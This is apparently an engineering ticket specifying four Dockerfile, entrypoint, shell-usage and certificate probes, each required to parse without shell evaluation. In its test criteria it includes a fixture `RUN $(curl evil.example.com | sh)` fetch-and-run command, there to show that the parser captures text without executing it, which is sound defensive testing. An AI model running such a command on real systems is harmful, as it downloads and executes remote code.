# Story S5-03 — `Dockerfile` + `Entrypoint` + `ShellUsage` + `Certificate` marker probes

**Step:** Step 5 — Ship Layer C (runtime + container) probes
**Status:** Ready
**Effort:** M
**Depends on:** S5-02 (the slice schema for `runtime_trace` is the upstream `ShellUsageProbe` reads), S3-03 (writer chokepoint), S1-08 (`@register_probe`)
**ADRs honored:** 02-ADR-0001 (no new binary needed beyond `docker`/`strace`; these probes are file-marker driven), 02-ADR-0007 (no Plugin Loader — probes are in-tree)

## Context

The remaining Layer C probes (`localv2.md` §5.3 C1, C5–C7) are marker-and-parse — each reads `Dockerfile` (and possibly the `runtime_trace` slice) and emits a typed slice. None of them invokes a subprocess; none of them needs an `ALLOWED_BINARIES` addition; each is ≤ 80–100 LOC. They depend on S5-02 only because `ShellUsageProbe` reads `RuntimeTraceProbe`'s `shell_invocations` count (the "shell usage" classification combines static Dockerfile evidence with the runtime trace's dynamic evidence — `localv2.md` §5.3 C5).

The Dockerfile parser is line-by-line with **no shell evaluation**. We do not run `RUN` commands; we do not expand `${VAR}`; we do not call out to BuildKit's parser. The shape we emit (`FROM` chain, `USER`, `EXPOSE`, `HEALTHCHECK`, `CMD`/`ENTRYPOINT` literals) is what Phase 3's distroless planner reads — sufficient for the planner without inheriting the supply-chain attack surface of a real Dockerfile evaluator. `localv2.md` §5.3 C1 names the `dockerfile` Python library as the reference; we adopt it **only** if it can be vendored without shell evaluation. If not, the parser is a hand-rolled state machine over the line forms named in `localv2.md` §5.3 C1.

## References

- [localv2.md §5.3 C1 (DockerfileProbe)](../../../localv2.md) — output slice schema (stages, base images, run commands, copy directives, entrypoint, cmd, user, workdir, env, exposed ports, healthcheck, labels).
- [localv2.md §5.3 C5 (ShellUsageProbe)](../../../localv2.md) — static + dynamic shell evidence; replacement catalog (deferred to Phase 3+ — this probe emits the static-side evidence only).
- [localv2.md §5.3 C6 (EntrypointProbe), §5.3 C7 (CertificateProbe)](../../../localv2.md) — additional marker probes; certificate paths read at runtime feed into the distroless planner.
- [phase-arch-design.md §"Component design" #6](../phase-arch-design.md) — `RuntimeTraceProbe` slice fields `ShellUsageProbe` reads (`shell_invocations`, `binaries_executed`).
- [High-level-impl.md §"Step 5"](../High-level-impl.md) — "Dockerfile parser is marker + line-by-line (no shell evaluation)".
- [02-ADR-0001](../ADRs/0001-add-docker-and-security-cli-tools-to-allowed-binaries.md) — these probes need **no** subprocess; the Dockerfile parser is in-process.
- Phase 0 ADR-0004 (`additionalProperties: false`) — sub-schema convention.

## Goal

Land four marker-and-parse probes under `src/codegenie/probes/layer_c/`: `dockerfile.py`, `entrypoint.py`, `shell_usage.py`, `certificate.py`. Each is ≤ 100 LOC, each ships with happy-path + marker-absent unit tests, each has a sub-schema under `src/codegenie/schema/probes/layer_c/<probe>.schema.json` with `additionalProperties: false`. The Dockerfile parser is **line-by-line, no shell evaluation, no `RUN` execution**.

## Acceptance criteria

- [ ] `src/codegenie/probes/layer_c/dockerfile.py` exists; `@register_probe(heaviness="light")`; emits the slice shape from `localv2.md` §5.3 C1.
- [ ] `dockerfile.py` parser is **line-by-line, no shell evaluation** — a unit test asserts that a Dockerfile with `RUN $(curl evil.example.com/payload | sh)` produces a slice carrying the literal string in `run_commands[].command` (not evaluated, not expanded, no network call). A grep test asserts the module source contains zero `subprocess`, zero `os.system`, zero `eval`, zero `exec()` calls.
- [ ] `dockerfile.py` captures: `FROM` chain (all stages); `USER` directive per stage; `EXPOSE` literals; `HEALTHCHECK` literal capture (the full directive line); `CMD` and `ENTRYPOINT` literals (`exec` vs `shell` form distinguished); `WORKDIR`; `ENV` key/value pairs; `LABEL` key/value pairs; `COPY --from=<stage>` directives.
- [ ] **Multi-stage support:** a Dockerfile with `FROM build AS builder` then `FROM build:final` emits `stages` with the right `inherits_from` links. Unit test covers a 2-stage and a 3-stage fixture.
- [ ] **Marker absent:** a repo with no `Dockerfile` (and no `containerfile`/`Containerfile`) emits `confidence="unavailable"` and `dockerfiles: []`; no exception raised.
- [ ] **Multi-Dockerfile support:** a repo with `Dockerfile` + `Dockerfile.dev` + `apps/api/Dockerfile` emits `dockerfiles: [<three entries>]`; the slice's `dockerfiles[].path` is repo-root-relative.
- [ ] `src/codegenie/probes/layer_c/entrypoint.py` exists; `@register_probe(heaviness="light")`; reads the `dockerfile` slice's `dockerfiles[].entrypoint` field; classifies as `exec`-form vs `shell`-form; emits a probe-level summary (one final-stage entrypoint per Dockerfile).
- [ ] `entrypoint.py` marker-absent path: no Dockerfile → `confidence="unavailable"`; Dockerfile with no `ENTRYPOINT` and no `CMD` → `confidence="low"` + `form="absent"`.
- [ ] `src/codegenie/probes/layer_c/shell_usage.py` exists; `@register_probe(heaviness="light")`; reads the `dockerfile` slice **and** the `runtime_trace` slice (`requires=["dockerfile", "runtime_trace"]` enforces dispatch order); emits **static evidence only** for Phase 2 (the dynamic-evidence-and-replacement-catalog flow is deferred — see "Out of scope"). Static evidence: `final_stage_entrypoint_form`, `final_stage_cmd_form`, `final_stage_run_commands` (`build_time` vs `runtime` classification based on stage).
- [ ] `shell_usage.py` reads `runtime_trace.shell_invocations` and emits `dynamic_shell_invocation_count: int | None` — `None` when `runtime_trace.confidence == "unavailable"`; the integer otherwise.
- [ ] `src/codegenie/probes/layer_c/certificate.py` exists; `@register_probe(heaviness="light")`; reads `runtime_trace.cert_paths_read` (`requires=["runtime_trace"]`); emits the list + a typed `certificate_source: Literal["ca-certificates", "vendored", "absent", "unknown"]` classification derived from the path prefixes (`/etc/ssl/certs/ca-certificates.crt` → `"ca-certificates"`; `/app/vendor/certs/` prefix → `"vendored"`; empty list → `"absent"`).
- [ ] Every probe has a sub-schema under `src/codegenie/schema/probes/layer_c/<name>.schema.json` with `additionalProperties: false` at the root and at every nested object (Phase 1 ADR-0004 convention). A sub-schema rejection test per probe presents a slice with one extra field and asserts validation rejects it.
- [ ] All four probes' slices flow through the writer chokepoint as `RedactedSlice` (S3-03).
- [ ] `mypy --strict` clean.
- [ ] Each module is ≤ 100 LOC (excluding docstrings + imports); enforce via `wc -l` smoke test that asserts `< 150` raw lines (allow 50-line slack for docstrings).
- [ ] `forbidden-patterns` stays green — no `model_construct`; no `subprocess`; no `eval`/`exec`.

## Implementation outline

1. **`dockerfile.py`** — hand-roll a line-by-line parser. Tokenize each line by leading directive (`FROM`, `RUN`, `COPY`, `USER`, `EXPOSE`, `HEALTHCHECK`, `CMD`, `ENTRYPOINT`, `WORKDIR`, `ENV`, `LABEL`, `ARG`, `ONBUILD`, `STOPSIGNAL`, `SHELL`, `VOLUME`, `MAINTAINER` (deprecated, captured anyway)). Pydantic model `DockerfileSlice` with `dockerfiles: list[ParsedDockerfile]`. Multi-line `RUN` with `\` continuation is concatenated (preserve `\n` markers in the captured string so a downstream reader can split). **Never evaluate** — capture literal strings only.
2. **`entrypoint.py`** — pure read of `dockerfile` slice; classification logic. No I/O.
3. **`shell_usage.py`** — pure read of `dockerfile` + `runtime_trace` slices; static classification (final-stage `RUN` commands, entrypoint form). `requires=["dockerfile", "runtime_trace"]` ensures dispatch order (S5-04 introduces the `requires` mechanism if not already in S1-08 — surface in "Notes for the implementer"). The replacement catalog (`localv2.md` §5.3 C5) is deferred — emit static evidence only.
4. **`certificate.py`** — pure read of `runtime_trace.cert_paths_read`; classification by path prefix.
5. **Sub-schemas** — four `<name>.schema.json` files under `src/codegenie/schema/probes/layer_c/`; each with `additionalProperties: false` at every object node; each referenced by `src/codegenie/schema/repo-context.schema.json` `oneOf` / `properties` (incremental — match how S4-07 wired Layer B sub-schemas).
6. **Tests** — happy-path + marker-absent + sub-schema rejection per probe.

## TDD plan — red / green / refactor

**Red:**

1. `test_dockerfile_probe_register_light` — registry introspection asserts `heaviness == "light"`.
2. `test_dockerfile_parser_no_shell_evaluation` — feed a fixture Dockerfile containing `RUN $(curl evil.example.com | sh)`; assert the slice's `run_commands[0].command == "$(curl evil.example.com | sh)"` literally; assert no network call (mock-spy on `socket` import — already banned by `fence`).
3. `test_dockerfile_parser_no_subprocess_in_source` — grep the source: zero `subprocess`, zero `os.system`, zero `eval(`, zero `exec(`.
4. `test_dockerfile_multi_stage_2` and `test_dockerfile_multi_stage_3` — fixture Dockerfiles with 2 and 3 stages; assert stage names, `inherits_from`, base images extracted correctly.
5. `test_dockerfile_marker_absent` — repo snapshot with no `Dockerfile`; assert `confidence="unavailable"`, `dockerfiles == []`.
6. `test_dockerfile_multiple_files` — fixture with `Dockerfile`, `Dockerfile.dev`, `apps/api/Dockerfile`; assert three entries with repo-root-relative paths.
7. `test_dockerfile_directive_coverage` — single fixture with one of each directive type; assert each is parsed into the matching field.
8. `test_entrypoint_probe_exec_form` and `test_entrypoint_probe_shell_form` — table-driven over `["sh", "-c", "echo hi"]` vs `"echo hi"`.
9. `test_entrypoint_absent` — Dockerfile with no `ENTRYPOINT` / `CMD` → `form="absent"`, `confidence="low"`.
10. `test_shell_usage_static_only` — feed fixture `dockerfile` slice + `runtime_trace` slice; assert `final_stage_run_commands` reflects only `RUN` lines from the final stage; `build_time` vs `runtime` classification matches.
11. `test_shell_usage_dynamic_count_when_runtime_trace_unavailable` — `runtime_trace.confidence == "unavailable"` → `dynamic_shell_invocation_count is None`.
12. `test_shell_usage_dynamic_count_present` — `runtime_trace.shell_invocations == 3` → `dynamic_shell_invocation_count == 3`.
13. `test_certificate_classification` — table over path-prefix → classification: `/etc/ssl/certs/ca-certificates.crt` → `"ca-certificates"`; `/app/vendor/certs/*` → `"vendored"`; `[]` → `"absent"`; novel path → `"unknown"`.
14. Per-probe sub-schema rejection: present a slice JSON with one extra field; assert `jsonschema.validate` raises.

**Green:**

1. Implement the four parsers + the four sub-schemas.
2. Wire `requires=["dockerfile", "runtime_trace"]` on `ShellUsageProbe`; `requires=["runtime_trace"]` on `CertificateProbe`. If `requires` is not yet a `@register_probe` kwarg, surface the gap — S5-04 also depends on `requires`, so it must land in S1-08 or be added here as a follow-up.
3. Make all red tests pass.

**Refactor:**

1. Extract Dockerfile-line tokenization into `_tokenize_dockerfile_line(line: str) -> Directive | None` — pure, table-driven, easily unit-testable.
2. Confirm each module is ≤ 100 LOC (excluding docstrings); refactor if not.
3. Each probe's `run()` is a 10–20-line wrapper around the pure parser/classifier — keep the I/O thin.

## Files to touch

- **New:** `src/codegenie/probes/layer_c/dockerfile.py`, `src/codegenie/probes/layer_c/entrypoint.py`, `src/codegenie/probes/layer_c/shell_usage.py`, `src/codegenie/probes/layer_c/certificate.py`.
- **New schemas:** `src/codegenie/schema/probes/layer_c/{dockerfile,entrypoint,shell_usage,certificate}.schema.json`.
- **New tests:** `tests/unit/probes/layer_c/{test_dockerfile.py,test_entrypoint.py,test_shell_usage.py,test_certificate.py}`.
- **New fixtures:** `tests/fixtures/dockerfiles/{single_stage,two_stage,three_stage,no_dockerfile,evil_run_command,multi_dockerfile}/...`.
- **Possibly extend:** `src/codegenie/schema/repo-context.schema.json` — wire the four sub-schemas (mirror how S4-07 wired Layer B).

## Out of scope

- The replacement catalog (`localv2.md` §5.3 C5 — the YAML-driven shell-replacement classifier) — defer to Phase 3 / Phase 7 when the distroless planner consumes it; this probe emits static evidence only.
- Falling back to BuildKit's `buildctl debug dump-llb` (`localv2.md` §5.3 C1 fallback) — explicitly **not** in Phase 2 (would require `buildctl` in `ALLOWED_BINARIES`, no ADR). If the hand-rolled parser proves insufficient on the portfolio fixtures, surface as an ADR-amend candidate in Phase 3.
- `secrets in Dockerfile` detection (`COPY --chown=...:... secrets.json /app`) — `gitleaks` (S6-07) catches secrets at the file level; this probe surfaces the `COPY` directive literally and lets `gitleaks` do its job.
- The `runtime_trace` sub-schema — landed by S5-02 / S5-04 (this story validates the slice shape only as a downstream reader).
- `SBOMProbe` / `CVEProbe` — **S5-04**.

## Notes for the implementer

- **`requires` mechanism.** `ShellUsageProbe` and `CertificateProbe` need to dispatch *after* `RuntimeTraceProbe` (and `DockerfileProbe` for `ShellUsageProbe`). If S1-08's `@register_probe` decorator doesn't yet accept a `requires: list[str]` kwarg, this story is the named-trigger for adding it. The coordinator sort-order edit (S1-08) already sorts by `heaviness` and `runs_last`; `requires` is a topological hint, not a scheduler. Surface the gap in PR description; the simplest implementation is a one-arm topological sort *after* the heaviness sort.
- **`localv2.md` §5.3 C1 names `dockerfile` (the Python library) as the parser of choice.** Evaluate it: if it ships with shell evaluation enabled by default (or imports anything from `subprocess`), we cannot adopt it. Hand-rolled parser is the safe fallback — Dockerfile's surface is small (~20 directives), and the test corpus covers the shapes Phase 3 will need. Decision criterion: **zero shell evaluation, zero subprocess imports**. If the vendored library passes the audit, prefer it; otherwise hand-roll. Document the decision in the module docstring.
- **`secrets in Dockerfile`** path: a `RUN` command containing `AWS_SECRET_ACCESS_KEY=AKIA…` flows through the writer chokepoint and is redacted via S3-01's `SecretRedactor`. The dockerfile parser does **not** filter; it captures the literal, the writer redacts. This is the same chokepoint discipline Layer G scanners use.
- **`requires` ordering vs cache.** If `RuntimeTraceProbe` cache-HITs (per S5-02), the downstream probes (`ShellUsageProbe`, `CertificateProbe`) still need the cached slice's content. The coordinator's slice-map (Phase 0) carries cached output to dependent probes; no special handling here.
- **Multi-Dockerfile semantics.** Some repos have `Dockerfile` for production + `Dockerfile.dev` for development + per-app Dockerfiles under `apps/<service>/Dockerfile`. We emit all of them; `RuntimeTraceProbe` (S5-02) traces only one (the canonical `Dockerfile` at repo root, configurable via `.codegenie/scenarios.yaml` in a future ADR). Phase 3's planner reads the parsed list and picks which one to migrate.
- **`shell_usage.py` replacement catalog deferral.** The catalog (`localv2.md` §5.3 C5) is the kind of org-uniqueness data that lives under `~/.codegenie/replacement-catalogs/` and is loaded by a Phase 3 / Phase 7 loader — not Phase 2. The CLAUDE.md commitment "organizational uniqueness as data, not prompts" applies here: Phase 2 emits the *evidence*; Phase 3+ owns the *catalog*. Resist landing a catalog loader here even if the YAML format is obvious.
- **`certificate_source` classification table.** Keep it small (4 buckets). If the portfolio surfaces a fifth pattern, extend via ADR-amend (small, additive).
- **`additionalProperties: false`** is non-negotiable per Phase 1 ADR-0004; the rejection test per probe is the structural enforcement.
- **`mypy --warn-unreachable`** — these four modules are simple enough that an exhaustive `match` isn't load-bearing; the S1-11 per-module override list need not include them. If a `match` on a discriminated union shows up (e.g., on `certificate_source`'s `Literal`), add the override.
- **LOC budget.** ≤ 100 LOC per probe is the design discipline. If you find yourself over 120 LOC, the parser has too much logic — extract pure helpers and keep the `run()` method thin (10–20 LOC).
